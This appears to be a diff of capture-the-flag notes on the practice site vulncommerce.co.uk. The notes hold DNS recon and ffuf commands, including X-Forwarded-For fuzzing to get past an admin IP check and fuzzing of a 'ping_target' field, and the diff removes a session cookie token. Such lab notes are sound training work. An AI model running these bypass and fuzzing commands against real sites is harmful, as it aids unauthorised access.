@@ -1,6 +1,5 @@
 Domain: www.vulncommerce.co.uk
 Ip: 68.183.255.206
-"Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="
 server: nginx/1.21.1
 
 nslookup:
@@ -13,7 +12,7 @@ dnsrecon -d vulncommerce.co.uk -D ~/wordlist/subdomains.txt -t brt
 
 
 ----------------Content discovery-------------------------------------------
-ffuf -H "Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="  -w ~/wordlists/content.txt -u "http://vulncommerce.co.uk/FUZZ?session_id=ZWFiNjdjMjY4NTQyOTE3Y2I1OWVhZGQzNjY1MmZjNjE2Yjc4MTc3NDNlZmU3YWIyMzY0NzM5ZmJjYWZjZDBjY2MwY2ZjOTdlYTVjZGI3NTI2OTgyNDU4ZTFkZWRkNDc0ODc2YzAyNjlhNTU5OThkZWQxMDhlZDcyMDkzNWM1MWE=" -t 1 -p 0.1 -mc all -fc 404 -c
+ffuf -H "Cookie: "  -w ~/wordlists/content.txt -u "http://vulncommerce.co.uk/FUZZ?session_id=ZWFiNjdjMjY4NTQyOTE3Y2I1OWVhZGQzNjY1MmZjNjE2Yjc4MTc3NDNlZmU3YWIyMzY0NzM5ZmJjYWZjZDBjY2MwY2ZjOTdlYTVjZGI3NTI2OTgyNDU4ZTFkZWRkNDc0ODc2YzAyNjlhNTU5OThkZWQxMDhlZDcyMDkzNWM1MWE=" -t 1 -p 0.1 -mc all -fc 404 -c
 
 
 vulncommerce.co.uk: basket, login, logout, profile, stats
@@ -93,7 +92,7 @@ IP: 68.183.255.206
 nameserver = ns1.digitalocean.com
 IP: 139.59.142.21
 
-ffuf -H "X-Forwarded-For: FUZZ" -H "Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="  -w ~/ip.txt -u "http://www.vulncommerce.co.uk/adm1n-man4gem3nt-12bfb3" -H "Content-Type: application/x-www-form-urlencoded" -t 1 -p 0.1 -mc all -fc 404 -c -fr "Connection from FUZZ"
+ffuf -H "X-Forwarded-For: FUZZ" -H "Cookie: "  -w ~/ip.txt -u "http://www.vulncommerce.co.uk/adm1n-man4gem3nt-12bfb3" -H "Content-Type: application/x-www-form-urlencoded" -t 1 -p 0.1 -mc all -fc 404 -c -fr "Connection from FUZZ"
 
 
 ----------------------------login-------------------------------------------
@@ -109,4 +108,4 @@ ffuf -H "X-Forwarded-For: FUZZ" -H "Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlK
 
 
 //Testing Ip's 
-ffuf -X POST -d "ping_target=FUZZ" -H "Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="  -w ~/ip.txt -u "http://www.vulncommerce.co.uk/stats" -H "Content-Type: application/x-www-form-urlencoded" -t 1 -p 0.1 -mc all -fc 404 -c -fr "PASS"
+ffuf -X POST -d "ping_target=FUZZ" -H "Cookie: "  -w ~/ip.txt -u "http://www.vulncommerce.co.uk/stats" -H "Content-Type: application/x-www-form-urlencoded" -t 1 -p 0.1 -mc all -fc 404 -c -fr "PASS"
